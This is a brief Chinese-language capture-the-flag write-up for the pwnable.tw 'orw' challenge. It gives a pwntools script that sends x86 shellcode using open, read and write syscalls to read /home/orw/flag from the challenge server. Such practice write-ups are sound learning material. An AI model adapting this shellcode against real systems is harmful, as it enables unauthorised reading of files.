pwnable.tw 学习 orw

参考：

    http://dogewatch.github.io/2017/04/10/pwnable.tw-Part1/
	http://www.reshahar.com/2017/05/20/pwnable-tw-orw%E8%A7%A3%E6%9E%90/
	
# start 

做题步骤：
通过ida查看汇编代码或者用gdb的checksec可以发现这个程序看起了CANNARY防护功能，不过无所谓，我们在这里用不到栈溢出，因为可以直接布置shellcode然后执行。同时题目描述还说了’Read the flag from /home/orw/flag.Only open read write syscall are allowed to use.’。因此这个题目就变成了如何写汇编来使用这三个系统调用来读取指定文件。我们可以先写一个伪C代码：

char* file = 'home/orw/flag';
sys_open(file,0,0);
sys_read(3,file,0x30);
sys_write(1,file,0x30);
把这段代码转成汇编代码就是shellcode，最终的payload如下：

from pwn import *

debug = False

if debug:
	s = process('./orw')
	context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
	gdb.attach(proc.pidof(s)[0])
else:
	s = remote('chall.pwnable.tw',10001)

shellcode = ''
shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')
shellcode += asm('xchg ecx,ebx;mov bl,0x3;mov dl,0x30;int 0x80;')
shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')

def pwn():
	recv = s.recvuntil(':')
	print recv
	s.sendline(shellcode)
	flag = s.recv()
	print flag

pwn()
